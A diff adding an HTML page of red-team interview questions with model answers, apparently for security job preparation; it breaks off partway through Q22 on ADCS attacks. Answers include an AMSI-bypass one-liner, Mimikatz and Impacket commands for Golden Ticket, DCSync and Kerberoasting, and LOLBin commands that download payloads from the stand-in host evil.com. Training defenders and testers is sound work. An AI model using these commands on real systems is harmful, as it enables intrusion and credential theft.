@@ -1,0 +1,1054 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="description" content="30 Red Team Interview Questions with detailed answers">
+    <title>Red Team Interview Questions | SecInterview</title>
+    <link rel="stylesheet" href="../css/style.css">
+</head>
+<body>
+    <nav class="navbar">
+        <div class="nav-container">
+            <a href="../index.html" class="logo">SecInterview</a>
+            <ul class="nav-links">
+                <li><a href="../index.html">Home</a></li>
+                <li><a href="pentest.html">Pentest</a></li>
+                <li><a href="redteam.html" class="active">Red Team</a></li>
+                <li><a href="mobile.html">Mobile</a></li>
+                <li><a href="network.html">Network</a></li>
+                <li><a href="cloud.html">Cloud</a></li>
+                <li><a href="tools.html">Tools</a></li>
+                <li><a href="submit.html">Submit</a></li>
+            </ul>
+            <div class="hamburger">
+                <span></span>
+                <span></span>
+                <span></span>
+            </div>
+        </div>
+    </nav>
+
+    <header class="page-header">
+        <h1>Red Team Operations</h1>
+        <p>30 interview questions covering adversary simulation, C2, evasion, and tactics</p>
+    </header>
+
+    <main class="container questions-container">
+        <a href="../index.html" class="back-link">&larr; Back to Categories</a>
+
+        <!-- Question 1 -->
+        <div class="question-card">
+            <div class="question-header">
+                <span class="question-number">Q1</span>
+                <span class="question-text">What is the difference between red teaming and penetration testing?</span>
+                <span class="difficulty-badge difficulty-easy">Easy</span>
+                <span class="toggle-icon">+</span>
+            </div>
+            <div class="answer-content">
+                <div class="answer-text">
+                    <p><strong>Penetration Testing:</strong></p>
+                    <ul>
+                        <li>Focused on finding technical vulnerabilities</li>
+                        <li>Defined scope and time-boxed</li>
+                        <li>Goal: Find as many vulnerabilities as possible</li>
+                        <li>Usually known to IT/security teams</li>
+                        <li>Compliance-driven in many cases</li>
+                    </ul>
+                    <p><strong>Red Teaming:</strong></p>
+                    <ul>
+                        <li>Simulates real adversary behavior and TTPs</li>
+                        <li>Goal-oriented (e.g., access crown jewels, exfiltrate data)</li>
+                        <li>Tests people, processes, and technology</li>
+                        <li>Often unknown to defenders (tests detection capabilities)</li>
+                        <li>Longer duration, more stealth-focused</li>
+                        <li>Includes physical and social engineering</li>
+                    </ul>
+                    <p><strong>Key difference:</strong> Pentest asks "what vulnerabilities exist?" Red team asks "can an attacker achieve X objective while evading detection?"</p>
+                </div>
+            </div>
+        </div>
+
+        <!-- Question 2 -->
+        <div class="question-card">
+            <div class="question-header">
+                <span class="question-number">Q2</span>
+                <span class="question-text">Explain the MITRE ATT&CK framework and how you use it.</span>
+                <span class="difficulty-badge difficulty-medium">Medium</span>
+                <span class="toggle-icon">+</span>
+            </div>
+            <div class="answer-content">
+                <div class="answer-text">
+                    <p><strong>MITRE ATT&CK</strong> is a knowledge base of adversary tactics, techniques, and procedures (TTPs) based on real-world observations.</p>
+                    <p><strong>Structure:</strong></p>
+                    <ul>
+                        <li><strong>Tactics:</strong> The adversary's goals (14 tactics: Recon, Initial Access, Execution, etc.)</li>
+                        <li><strong>Techniques:</strong> How objectives are achieved</li>
+                        <li><strong>Sub-techniques:</strong> Specific implementations</li>
+                        <li><strong>Procedures:</strong> Real-world examples from threat actors</li>
+                    </ul>
+                    <p><strong>Red team usage:</strong></p>
+                    <ul>
+                        <li>Planning operations based on specific threat actor TTPs</li>
+                        <li>Mapping tools and techniques to framework</li>
+                        <li>Reporting findings in standardized language</li>
+                        <li>Identifying gaps in defensive coverage</li>
+                        <li>Creating purple team exercises</li>
+                    </ul>
+                    <p><strong>Resources:</strong> ATT&CK Navigator, Atomic Red Team, MITRE CALDERA</p>
+                </div>
+            </div>
+        </div>
+
+        <!-- Question 3 -->
+        <div class="question-card">
+            <div class="question-header">
+                <span class="question-number">Q3</span>
+                <span class="question-text">What C2 frameworks have you used and why?</span>
+                <span class="difficulty-badge difficulty-medium">Medium</span>
+                <span class="toggle-icon">+</span>
+            </div>
+            <div class="answer-content">
+                <div class="answer-text">
+                    <p><strong>Common C2 Frameworks:</strong></p>
+                    <ul>
+                        <li><strong>Cobalt Strike:</strong> Industry standard, malleable C2 profiles, extensive features, good OPSEC options</li>
+                        <li><strong>Sliver:</strong> Open-source, cross-platform, supports multiple protocols, growing community</li>
+                        <li><strong>Mythic:</strong> Modular, supports multiple agent types, great UI, customizable</li>
+                        <li><strong>Havoc:</strong> Modern, demon agent, good evasion capabilities</li>
+                        <li><strong>Brute Ratel:</strong> Focused on EDR evasion, badger agent</li>
+                        <li><strong>Covenant:</strong> .NET based, good for Windows environments</li>
+                    </ul>
+                    <p><strong>Selection criteria:</strong></p>
+                    <ul>
+                        <li>Target environment (Windows, Linux, cross-platform)</li>
+                        <li>EDR/AV evasion requirements</li>
+                        <li>Communication protocol flexibility</li>
+                        <li>Team collaboration features</li>
+                        <li>Customization and extensibility</li>
+                        <li>OPSEC considerations</li>
+                    </ul>
+                </div>
+            </div>
+        </div>
+
+        <!-- Question 4 -->
+        <div class="question-card">
+            <div class="question-header">
+                <span class="question-number">Q4</span>
+                <span class="question-text">How would you establish persistence on a Windows system?</span>
+                <span class="difficulty-badge difficulty-medium">Medium</span>
+                <span class="toggle-icon">+</span>
+            </div>
+            <div class="answer-content">
+                <div class="answer-text">
+                    <p><strong>Windows Persistence Techniques:</strong></p>
+                    <ul>
+                        <li><strong>Registry Run Keys:</strong> HKLM/HKCU\Software\Microsoft\Windows\CurrentVersion\Run</li>
+                        <li><strong>Scheduled Tasks:</strong> schtasks for recurring execution</li>
+                        <li><strong>Services:</strong> Create or modify Windows services</li>
+                        <li><strong>Startup Folder:</strong> Drop executables in startup directory</li>
+                        <li><strong>WMI Event Subscriptions:</strong> Trigger on events (process start, time)</li>
+                        <li><strong>DLL Hijacking:</strong> Replace or add DLLs in search path</li>
+                        <li><strong>COM Hijacking:</strong> Modify COM object registry entries</li>
+                        <li><strong>AppInit_DLLs:</strong> Load DLL into every user-mode process</li>
+                        <li><strong>BITS Jobs:</strong> Background Intelligent Transfer Service</li>
+                        <li><strong>Golden Ticket:</strong> Forged Kerberos tickets</li>
+                    </ul>
+                    <p><strong>Considerations:</strong> Stealth vs. reliability, user vs. system context, survival across reboots, EDR detection</p>
+                </div>
+            </div>
+        </div>
+
+        <!-- Question 5 -->
+        <div class="question-card">
+            <div class="question-header">
+                <span class="question-number">Q5</span>
+                <span class="question-text">Explain Kerberoasting and how to execute it.</span>
+                <span class="difficulty-badge difficulty-hard">Hard</span>
+                <span class="toggle-icon">+</span>
+            </div>
+            <div class="answer-content">
+                <div class="answer-text">
+                    <p><strong>Kerberoasting</strong> extracts service account password hashes by requesting Kerberos service tickets (TGS) which are encrypted with the service account's password.</p>
+                    <p><strong>Attack flow:</strong></p>
+                    <ol>
+                        <li>Authenticate to domain as any user</li>
+                        <li>Enumerate accounts with SPNs (Service Principal Names)</li>
+                        <li>Request TGS tickets for those services</li>
+                        <li>Extract tickets from memory</li>
+                        <li>Crack offline with hashcat/john</li>
+                    </ol>
+                    <p><strong>Tools:</strong></p>
+                    <ul>
+                        <li><code>GetUserSPNs.py</code> (Impacket)</li>
+                        <li><code>Rubeus kerberoast</code></li>
+                        <li><code>Invoke-Kerberoast</code> (PowerView)</li>
+                    </ul>
+                    <p><strong>Example:</strong></p>
+                    <pre><code>GetUserSPNs.py domain/user:password -dc-ip 10.10.10.10 -request</code></pre>
+                    <p><strong>Defense:</strong> Strong service account passwords, Managed Service Accounts (MSA/gMSA), monitor TGS requests</p>
+                </div>
+            </div>
+        </div>
+
+        <!-- Question 6 -->
+        <div class="question-card">
+            <div class="question-header">
+                <span class="question-number">Q6</span>
+                <span class="question-text">What is AMSI and how do you bypass it?</span>
+                <span class="difficulty-badge difficulty-hard">Hard</span>
+                <span class="toggle-icon">+</span>
+            </div>
+            <div class="answer-content">
+                <div class="answer-text">
+                    <p><strong>AMSI (Antimalware Scan Interface)</strong> is a Windows API that allows applications to integrate with antimalware products. It scans scripts (PowerShell, VBScript, JScript) and .NET assemblies.</p>
+                    <p><strong>Bypass techniques:</strong></p>
+                    <ul>
+                        <li><strong>Memory patching:</strong> Patch AmsiScanBuffer to return clean result
+                            <pre><code>[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)</code></pre>
+                        </li>
+                        <li><strong>Obfuscation:</strong> Encode/encrypt payloads to avoid signature detection</li>
+                        <li><strong>Reflection:</strong> Use .NET reflection to modify AMSI internals</li>
+                        <li><strong>PowerShell downgrade:</strong> Use PowerShell v2 (if available) which lacks AMSI</li>
+                        <li><strong>Unhooking:</strong> Restore original DLL bytes</li>
+                        <li><strong>Hardware breakpoints:</strong> Use hardware BP to skip AMSI check</li>
+                    </ul>
+                    <p><strong>Note:</strong> Bypasses are regularly signatured; use custom variations and test before engagement.</p>
+                </div>
+            </div>
+        </div>
+
+        <!-- Question 7 -->
+        <div class="question-card">
+            <div class="question-header">
+                <span class="question-number">Q7</span>
+                <span class="question-text">How do you perform lateral movement in an Active Directory environment?</span>
+                <span class="difficulty-badge difficulty-medium">Medium</span>
+                <span class="toggle-icon">+</span>
+            </div>
+            <div class="answer-content">
+                <div class="answer-text">
+                    <p><strong>Lateral Movement Techniques:</strong></p>
+                    <ul>
+                        <li><strong>Pass-the-Hash (PtH):</strong> Use NTLM hash to authenticate</li>
+                        <li><strong>Pass-the-Ticket (PtT):</strong> Use Kerberos tickets</li>
+                        <li><strong>Overpass-the-Hash:</strong> Request Kerberos ticket with NTLM hash</li>
+                        <li><strong>PsExec:</strong> Remote service execution</li>
+                        <li><strong>WMI:</strong> Remote process execution via WMI</li>
+                        <li><strong>WinRM:</strong> PowerShell remoting</li>
+                        <li><strong>DCOM:</strong> Distributed Component Object Model</li>
+                        <li><strong>SMB:</strong> Direct file/service access</li>
+                        <li><strong>RDP:</strong> Remote Desktop with stolen credentials</li>
+                        <li><strong>SSH:</strong> If available on Windows/Linux systems</li>
+                    </ul>
+                    <p><strong>Tools:</strong> Impacket (wmiexec, psexec, smbexec), CrackMapExec, Rubeus, Mimikatz</p>
+                    <p><strong>OPSEC:</strong> Consider detection signatures, use less common techniques, blend with normal traffic</p>
+                </div>
+            </div>
+        </div>
+
+        <!-- Question 8 -->
+        <div class="question-card">
+            <div class="question-header">
+                <span class="question-number">Q8</span>
+                <span class="question-text">What is a Golden Ticket attack?</span>
+                <span class="difficulty-badge difficulty-hard">Hard</span>
+                <span class="toggle-icon">+</span>
+            </div>
+            <div class="answer-content">
+                <div class="answer-text">
+                    <p><strong>Golden Ticket</strong> is a forged Kerberos Ticket Granting Ticket (TGT) created using the KRBTGT account's password hash, granting unlimited access to the domain.</p>
+                    <p><strong>Requirements:</strong></p>
+                    <ul>
+                        <li>KRBTGT account NTLM hash</li>
+                        <li>Domain SID</li>
+                        <li>Domain name</li>
+                        <li>User account to impersonate (can be fake)</li>
+                    </ul>
+                    <p><strong>Attack flow:</strong></p>
+                    <ol>
+                        <li>Compromise Domain Controller</li>
+                        <li>Extract KRBTGT hash (DCSync or NTDS.dit)</li>
+                        <li>Create forged TGT with Mimikatz</li>
+                        <li>Inject ticket into session</li>
+                        <li>Access any resource as any user</li>
+                    </ol>
+                    <p><strong>Command:</strong></p>
+                    <pre><code>mimikatz # kerberos::golden /user:Administrator /domain:corp.local /sid:S-1-5-21-... /krbtgt:hash /ptt</code></pre>
+                    <p><strong>Detection:</strong> TGT lifetime anomalies, Event ID 4769 patterns, PAC validation failures</p>
+                </div>
+            </div>
+        </div>
+
+        <!-- Question 9 -->
+        <div class="question-card">
+            <div class="question-header">
+                <span class="question-number">Q9</span>
+                <span class="question-text">How do you perform domain enumeration?</span>
+                <span class="difficulty-badge difficulty-medium">Medium</span>
+                <span class="toggle-icon">+</span>
+            </div>
+            <div class="answer-content">
+                <div class="answer-text">
+                    <p><strong>Domain Enumeration Areas:</strong></p>
+                    <ul>
+                        <li><strong>Users:</strong> Privileged accounts, service accounts, disabled accounts</li>
+                        <li><strong>Groups:</strong> Domain Admins, Enterprise Admins, custom privileged groups</li>
+                        <li><strong>Computers:</strong> DCs, servers, workstations</li>
+                        <li><strong>GPOs:</strong> Group policies with sensitive settings</li>
+                        <li><strong>ACLs:</strong> Dangerous permissions (WriteDACL, GenericAll)</li>
+                        <li><strong>Trusts:</strong> Domain and forest trusts</li>
+                        <li><strong>SPNs:</strong> Kerberoastable accounts</li>
+                        <li><strong>Shares:</strong> Accessible network shares</li>
+                    </ul>
+                    <p><strong>Tools:</strong></p>
+                    <ul>
+                        <li><strong>BloodHound:</strong> Graph-based AD analysis</li>
+                        <li><strong>PowerView:</strong> PowerShell AD enumeration</li>
+                        <li><strong>ADRecon:</strong> Comprehensive AD audit</li>
+                        <li><strong>ldapdomaindump:</strong> LDAP-based enumeration</li>
+                        <li><strong>CrackMapExec:</strong> Network service enumeration</li>
+                    </ul>
+                    <p><strong>OPSEC:</strong> BloodHound collection can be noisy; use targeted LDAP queries when stealth is needed</p>
+                </div>
+            </div>
+        </div>
+
+        <!-- Question 10 -->
+        <div class="question-card">
+            <div class="question-header">
+                <span class="question-number">Q10</span>
+                <span class="question-text">Explain DCSync attack and its prerequisites.</span>
+                <span class="difficulty-badge difficulty-hard">Hard</span>
+                <span class="toggle-icon">+</span>
+            </div>
+            <div class="answer-content">
+                <div class="answer-text">
+                    <p><strong>DCSync</strong> uses Directory Replication Service (DRS) protocol to request password data from a Domain Controller, mimicking DC-to-DC replication.</p>
+                    <p><strong>Prerequisites:</strong></p>
+                    <ul>
+                        <li>Account with replication rights:
+                            <ul>
+                                <li>Replicating Directory Changes</li>
+                                <li>Replicating Directory Changes All</li>
+                            </ul>
+                        </li>
+                        <li>By default: Domain Admins, Enterprise Admins, DC computer accounts</li>
+                    </ul>
+                    <p><strong>Attack:</strong></p>
+                    <pre><code># Mimikatz
+lsadump::dcsync /domain:corp.local /user:Administrator
+
+# Impacket
+secretsdump.py domain/user:password@dc-ip</code></pre>
+                    <p><strong>What you get:</strong></p>
+                    <ul>
+                        <li>NTLM password hashes</li>
+                        <li>Kerberos keys</li>
+                        <li>Password history</li>
+                        <li>KRBTGT hash for Golden Ticket</li>
+                    </ul>
+                    <p><strong>Detection:</strong> Event ID 4662 for DS-Replication-Get-Changes, monitor non-DC sources</p>
+                </div>
+            </div>
+        </div>
+
+        <!-- Question 11 -->
+        <div class="question-card">
+            <div class="question-header">
+                <span class="question-number">Q11</span>
+                <span class="question-text">How do you evade EDR solutions?</span>
+                <span class="difficulty-badge difficulty-hard">Hard</span>
+                <span class="toggle-icon">+</span>
+            </div>
+            <div class="answer-content">
+                <div class="answer-text">
+                    <p><strong>EDR Evasion Techniques:</strong></p>
+                    <ul>
+                        <li><strong>Unhooking:</strong> Remove EDR hooks from ntdll.dll by loading fresh copy</li>
+                        <li><strong>Direct syscalls:</strong> Bypass user-mode hooks by calling kernel directly</li>
+                        <li><strong>Indirect syscalls:</strong> Use legitimate syscall instructions from ntdll</li>
+                        <li><strong>Module stomping:</strong> Load payload into legitimate module's memory</li>
+                        <li><strong>Sleep obfuscation:</strong> Encrypt beacon in memory during sleep</li>
+                        <li><strong>ETW patching:</strong> Disable Event Tracing for Windows</li>
+                        <li><strong>Callback evasion:</strong> Enumerate and disable kernel callbacks</li>
+                        <li><strong>PPID spoofing:</strong> Fake parent process to blend in</li>
+                        <li><strong>Timestomping:</strong> Modify file timestamps</li>
+                    </ul>
+                    <p><strong>Operational techniques:</strong></p>
+                    <ul>
+                        <li>Living off the land (LOLBins)</li>
+                        <li>Signed binary proxy execution</li>
+                        <li>Custom tooling with unique signatures</li>
+                    </ul>
+                </div>
+            </div>
+        </div>
+
+        <!-- Question 12 -->
+        <div class="question-card">
+            <div class="question-header">
+                <span class="question-number">Q12</span>
+                <span class="question-text">What is AS-REP Roasting?</span>
+                <span class="difficulty-badge difficulty-medium">Medium</span>
+                <span class="toggle-icon">+</span>
+            </div>
+            <div class="answer-content">
+                <div class="answer-text">
+                    <p><strong>AS-REP Roasting</strong> targets accounts with "Do not require Kerberos preauthentication" enabled, allowing offline password cracking.</p>
+                    <p><strong>How it works:</strong></p>
+                    <ol>
+                        <li>Enumerate accounts with DONT_REQ_PREAUTH flag</li>
+                        <li>Request AS-REP for those accounts (no password needed)</li>
+                        <li>AS-REP contains encrypted data using user's password hash</li>
+                        <li>Crack offline</li>
+                    </ol>
+                    <p><strong>Tools:</strong></p>
+                    <pre><code># Impacket
+GetNPUsers.py domain/ -usersfile users.txt -dc-ip 10.10.10.10
+
+# Rubeus
+Rubeus.exe asreproast</code></pre>
+                    <p><strong>Cracking:</strong></p>
+                    <pre><code>hashcat -m 18200 hashes.txt wordlist.txt</code></pre>
+                    <p><strong>Difference from Kerberoasting:</strong> AS-REP Roasting targets user accounts without pre-auth; Kerberoasting targets service accounts with SPNs</p>
+                </div>
+            </div>
+        </div>
+
+        <!-- Question 13 -->
+        <div class="question-card">
+            <div class="question-header">
+                <span class="question-number">Q13</span>
+                <span class="question-text">How do you perform phishing for initial access?</span>
+                <span class="difficulty-badge difficulty-medium">Medium</span>
+                <span class="toggle-icon">+</span>
+            </div>
+            <div class="answer-content">
+                <div class="answer-text">
+                    <p><strong>Phishing Components:</strong></p>
+                    <ul>
+                        <li><strong>Pretext:</strong> Believable scenario (IT support, HR, vendor)</li>
+                        <li><strong>Infrastructure:</strong> Lookalike domains, SSL certificates, email servers</li>
+                        <li><strong>Payload:</strong> Office macros, HTA, ISO/IMG, LNK files, HTML smuggling</li>
+                        <li><strong>Landing page:</strong> Credential harvesting or payload delivery</li>
+                    </ul>
+                    <p><strong>Tools:</strong></p>
+                    <ul>
+                        <li><strong>Gophish:</strong> Campaign management and tracking</li>
+                        <li><strong>Evilginx2:</strong> Adversary-in-the-middle for MFA bypass</li>
+                        <li><strong>Modlishka:</strong> Real-time credential theft</li>
+                    </ul>
+                    <p><strong>Modern challenges:</strong></p>
+                    <ul>
+                        <li>Mark of the Web (MOTW) protections</li>
+                        <li>Office macro blocking by default</li>
+                        <li>Email gateway filtering</li>
+                        <li>Sandboxing</li>
+                    </ul>
+                    <p><strong>Current effective payloads:</strong> OneNote files, ISO/IMG with hidden extensions, HTML smuggling</p>
+                </div>
+            </div>
+        </div>
+
+        <!-- Question 14 -->
+        <div class="question-card">
+            <div class="question-header">
+                <span class="question-number">Q14</span>
+                <span class="question-text">What are some common OPSEC mistakes during red team engagements?</span>
+                <span class="difficulty-badge difficulty-medium">Medium</span>
+                <span class="toggle-icon">+</span>
+            </div>
+            <div class="answer-content">
+                <div class="answer-text">
+                    <p><strong>Common OPSEC Mistakes:</strong></p>
+                    <ul>
+                        <li><strong>Infrastructure:</strong>
+                            <ul>
+                                <li>Reusing infrastructure across engagements</li>
+                                <li>Not aging domains properly</li>
+                                <li>Poor redirector configuration</li>
+                                <li>Exposed team server</li>
+                            </ul>
+                        </li>
+                        <li><strong>Tooling:</strong>
+                            <ul>
+                                <li>Using default Cobalt Strike profiles</li>
+                                <li>Not customizing tool signatures</li>
+                                <li>Leaving tool artifacts on disk</li>
+                            </ul>
+                        </li>
+                        <li><strong>Network:</strong>
+                            <ul>
+                                <li>High beacon frequency</li>
+                                <li>Large data transfers at odd hours</li>
+                                <li>Not matching target's traffic patterns</li>
+                            </ul>
+                        </li>
+                        <li><strong>Host:</strong>
+                            <ul>
+                                <li>Running tools from user's temp folder</li>
+                                <li>Not cleaning up logs/artifacts</li>
+                                <li>Noisy enumeration (BloodHound collection)</li>
+                            </ul>
+                        </li>
+                    </ul>
+                </div>
+            </div>
+        </div>
+
+        <!-- Question 15 -->
+        <div class="question-card">
+            <div class="question-header">
+                <span class="question-number">Q15</span>
+                <span class="question-text">How would you dump credentials from a Windows system?</span>
+                <span class="difficulty-badge difficulty-medium">Medium</span>
+                <span class="toggle-icon">+</span>
+            </div>
+            <div class="answer-content">
+                <div class="answer-text">
+                    <p><strong>Credential Dumping Techniques:</strong></p>
+                    <ul>
+                        <li><strong>LSASS:</strong>
+                            <ul>
+                                <li>Mimikatz sekurlsa::logonpasswords</li>
+                                <li>ProcDump + offline parsing</li>
+                                <li>comsvcs.dll MiniDump</li>
+                                <li>Direct memory reading</li>
+                            </ul>
+                        </li>
+                        <li><strong>SAM Database:</strong>
+                            <ul>
+                                <li>reg save HKLM\SAM + SYSTEM</li>
+                                <li>Volume Shadow Copy</li>
+                                <li>secretsdump.py LOCAL</li>
+                            </ul>
+                        </li>
+                        <li><strong>NTDS.dit:</strong> ntdsutil, Volume Shadow Copy, DCSync</li>
+                        <li><strong>Cached credentials:</strong> HKLM\SECURITY</li>
+                        <li><strong>Browser passwords:</strong> Chrome, Firefox saved credentials</li>
+                        <li><strong>Credential Manager:</strong> Windows Credential Vault</li>
+                        <li><strong>DPAPI:</strong> Decrypt protected user data</li>
+                    </ul>
+                    <p><strong>Tools:</strong> Mimikatz, Rubeus, SharpDPAPI, LaZagne, secretsdump.py</p>
+                    <p><strong>Note:</strong> Credential Guard and LSA Protection make LSASS dumping harder on modern systems</p>
+                </div>
+            </div>
+        </div>
+
+        <!-- Question 16 -->
+        <div class="question-card">
+            <div class="question-header">
+                <span class="question-number">Q16</span>
+                <span class="question-text">Explain the difference between Silver Ticket and Golden Ticket.</span>
+                <span class="difficulty-badge difficulty-medium">Medium</span>
+                <span class="toggle-icon">+</span>
+            </div>
+            <div class="answer-content">
+                <div class="answer-text">
+                    <p><strong>Golden Ticket:</strong></p>
+                    <ul>
+                        <li>Forged TGT (Ticket Granting Ticket)</li>
+                        <li>Uses KRBTGT hash</li>
+                        <li>Grants access to ANY service in the domain</li>
+                        <li>Valid for any user (including non-existent)</li>
+                        <li>Works across entire domain</li>
+                        <li>Requires Domain Controller compromise</li>
+                    </ul>
+                    <p><strong>Silver Ticket:</strong></p>
+                    <ul>
+                        <li>Forged TGS (Service Ticket)</li>
+                        <li>Uses service account hash (computer or service)</li>
+                        <li>Grants access to SPECIFIC service only</li>
+                        <li>Never touches DC (harder to detect)</li>
+                        <li>Limited scope but stealthier</li>
+                        <li>Only needs service account hash</li>
+                    </ul>
+                    <p><strong>Use cases:</strong></p>
+                    <ul>
+                        <li>Golden: Full domain compromise, persistence</li>
+                        <li>Silver: Targeted access, avoiding detection, accessing specific service</li>
+                    </ul>
+                </div>
+            </div>
+        </div>
+
+        <!-- Question 17 -->
+        <div class="question-card">
+            <div class="question-header">
+                <span class="question-number">Q17</span>
+                <span class="question-text">What is Constrained Delegation and how can it be abused?</span>
+                <span class="difficulty-badge difficulty-hard">Hard</span>
+                <span class="toggle-icon">+</span>
+            </div>
+            <div class="answer-content">
+                <div class="answer-text">
+                    <p><strong>Kerberos Delegation</strong> allows services to impersonate users to access other services.</p>
+                    <p><strong>Types:</strong></p>
+                    <ul>
+                        <li><strong>Unconstrained:</strong> Service can impersonate to ANY service</li>
+                        <li><strong>Constrained:</strong> Limited to specified services (msDS-AllowedToDelegateTo)</li>
+                        <li><strong>Resource-Based Constrained (RBCD):</strong> Target controls who can delegate</li>
+                    </ul>
+                    <p><strong>Constrained Delegation Abuse:</strong></p>
+                    <ol>
+                        <li>Compromise account with constrained delegation</li>
+                        <li>Request TGT for compromised account</li>
+                        <li>Use S4U2Self to get ticket for any user</li>
+                        <li>Use S4U2Proxy to get TGS for allowed service</li>
+                        <li>Service class in SPN is modifiable (CIFS to LDAP)</li>
+                    </ol>
+                    <p><strong>Tools:</strong> Rubeus, getST.py (Impacket)</p>
+                    <p><strong>RBCD attack:</strong> If you can write msDS-AllowedToActOnBehalfOfOtherIdentity, configure delegation from controlled account</p>
+                </div>
+            </div>
+        </div>
+
+        <!-- Question 18 -->
+        <div class="question-card">
+            <div class="question-header">
+                <span class="question-number">Q18</span>
+                <span class="question-text">How do you approach social engineering during a red team engagement?</span>
+                <span class="difficulty-badge difficulty-medium">Medium</span>
+                <span class="toggle-icon">+</span>
+            </div>
+            <div class="answer-content">
+                <div class="answer-text">
+                    <p><strong>Social Engineering Approach:</strong></p>
+                    <ol>
+                        <li><strong>OSINT/Reconnaissance:</strong>
+                            <ul>
+                                <li>Employee names, roles, emails</li>
+                                <li>Organizational structure</li>
+                                <li>Technology stack</li>
+                                <li>Recent events (mergers, hiring)</li>
+                            </ul>
+                        </li>
+                        <li><strong>Pretext development:</strong>
+                            <ul>
+                                <li>Believable scenario</li>
+                                <li>Authority or urgency factors</li>
+                                <li>Tailored to target</li>
+                            </ul>
+                        </li>
+                        <li><strong>Execution vectors:</strong>
+                            <ul>
+                                <li>Phishing (email, SMS, voice)</li>
+                                <li>Physical access attempts</li>
+                                <li>Phone pretexting</li>
+                                <li>USB drops</li>
+                            </ul>
+                        </li>
+                        <li><strong>Documentation:</strong> Record all interactions for reporting</li>
+                    </ol>
+                    <p><strong>Ethics:</strong> Stay within scope, don't cause personal harm, follow rules of engagement</p>
+                </div>
+            </div>
+        </div>
+
+        <!-- Question 19 -->
+        <div class="question-card">
+            <div class="question-header">
+                <span class="question-number">Q19</span>
+                <span class="question-text">What is DLL sideloading and how is it used?</span>
+                <span class="difficulty-badge difficulty-medium">Medium</span>
+                <span class="toggle-icon">+</span>
+            </div>
+            <div class="answer-content">
+                <div class="answer-text">
+                    <p><strong>DLL Sideloading</strong> exploits the DLL search order in Windows by placing a malicious DLL in the same directory as a legitimate signed executable.</p>
+                    <p><strong>How it works:</strong></p>
+                    <ol>
+                        <li>Find signed executable that loads a DLL not in System32</li>
+                        <li>Create malicious DLL with expected name</li>
+                        <li>Place both in same directory</li>
+                        <li>Execute the legitimate binary</li>
+                        <li>Malicious DLL loads and executes payload</li>
+                    </ol>
+                    <p><strong>Benefits:</strong></p>
+                    <ul>
+                        <li>Signed binary executes the payload</li>
+                        <li>Bypasses application whitelisting</li>
+                        <li>Evades some EDR detections</li>
+                        <li>Blends with legitimate activity</li>
+                    </ul>
+                    <p><strong>Finding candidates:</strong> Use Process Monitor, SideloadHunter, or known vulnerable applications</p>
+                    <p><strong>DLL must:</strong> Export expected functions or proxy to legitimate DLL</p>
+                </div>
+            </div>
+        </div>
+
+        <!-- Question 20 -->
+        <div class="question-card">
+            <div class="question-header">
+                <span class="question-number">Q20</span>
+                <span class="question-text">How do you set up C2 infrastructure for an engagement?</span>
+                <span class="difficulty-badge difficulty-medium">Medium</span>
+                <span class="toggle-icon">+</span>
+            </div>
+            <div class="answer-content">
+                <div class="answer-text">
+                    <p><strong>C2 Infrastructure Components:</strong></p>
+                    <ul>
+                        <li><strong>Team Server:</strong> Primary C2 server (hidden behind redirectors)</li>
+                        <li><strong>Redirectors:</strong> Forward traffic, provide separation</li>
+                        <li><strong>Domains:</strong> Categorized, aged domains for legitimacy</li>
+                        <li><strong>SSL Certificates:</strong> Valid certificates (Let's Encrypt or purchased)</li>
+                        <li><strong>CDN/Cloud:</strong> Domain fronting or CDN hiding</li>
+                    </ul>
+                    <p><strong>Setup considerations:</strong></p>
+                    <ul>
+                        <li>Multiple providers for resilience</li>
+                        <li>Separate long-haul and short-haul C2</li>
+                        <li>Different protocols (HTTPS, DNS, DoH)</li>
+                        <li>Malleable profiles mimicking legitimate traffic</li>
+                        <li>Geographic considerations</li>
+                        <li>Logging and monitoring</li>
+                    </ul>
+                    <p><strong>Tools:</strong> Terraform for automation, Apache/Nginx for redirectors, socat for simple forwarding</p>
+                </div>
+            </div>
+        </div>
+
+        <!-- Question 21 -->
+        <div class="question-card">
+            <div class="question-header">
+                <span class="question-number">Q21</span>
+                <span class="question-text">What are some LOLBins and how do you use them?</span>
+                <span class="difficulty-badge difficulty-medium">Medium</span>
+                <span class="toggle-icon">+</span>
+            </div>
+            <div class="answer-content">
+                <div class="answer-text">
+                    <p><strong>LOLBins (Living Off the Land Binaries)</strong> are legitimate Windows binaries that can be abused for malicious purposes.</p>
+                    <p><strong>Common LOLBins:</strong></p>
+                    <ul>
+                        <li><strong>certutil:</strong> Download files, encode/decode
+                            <pre><code>certutil -urlcache -split -f http://evil.com/payload.exe</code></pre>
+                        </li>
+                        <li><strong>mshta:</strong> Execute HTA files
+                            <pre><code>mshta http://evil.com/payload.hta</code></pre>
+                        </li>
+                        <li><strong>regsvr32:</strong> Execute scriptlets
+                            <pre><code>regsvr32 /s /n /u /i:http://evil.com/file.sct scrobj.dll</code></pre>
+                        </li>
+                        <li><strong>rundll32:</strong> Execute DLL functions</li>
+                        <li><strong>wmic:</strong> Remote execution, process creation</li>
+                        <li><strong>msiexec:</strong> Execute MSI packages</li>
+                        <li><strong>bitsadmin:</strong> Download files</li>
+                        <li><strong>cmstp:</strong> Execute INF scripts</li>
+                    </ul>
+                    <p><strong>Resource:</strong> LOLBAS Project (lolbas-project.github.io)</p>
+                </div>
+            </div>
+        </div>
+
+        <!-- Question 22 -->
+        <div class="question-card">
+            <div class="question-header">
+                <span class="question-number">Q22</span>
+                <span class="question-text">How do you perform Active Directory Certificate Services (ADCS) attacks?</span>
+                <span class="difficulty-badge difficulty-hard">Hard</span>
+                <span class="toggle-icon">+</span>
+            </div>
+            <div class="answer-content">
+                <div class="answer-text">
+                    <p><strong>ADCS Attack Techniques (ESC1-ESC8):</strong></p>
+                    <ul>
+                        <li><strong>ESC1:</strong> Template allows requestor to specify SAN, enabling impersonation</li>
+                        <li><strong>ESC2:</strong> Any Purpose EKU or no EKU template</li>
+                        <li><strong>ESC3:</strong> Certificate Request Agent templates</li>
+                        <li><strong>ESC4:</strong> Vulnerable template ACLs (write permission)</li>
+                        <li><strong>ESC6:</strong> EDITF_ATTRIBUTESUBJECTALTNAME2 flag on CA</li>
+                        <li><strong>ESC7:</strong> Vulnerable CA ACLs (ManageCA, ManageCertificates)</li>
+                        <li><strong>ESC8:</strong> NTLM relay to HTTP certificate enrollment</li>
+                    </ul>
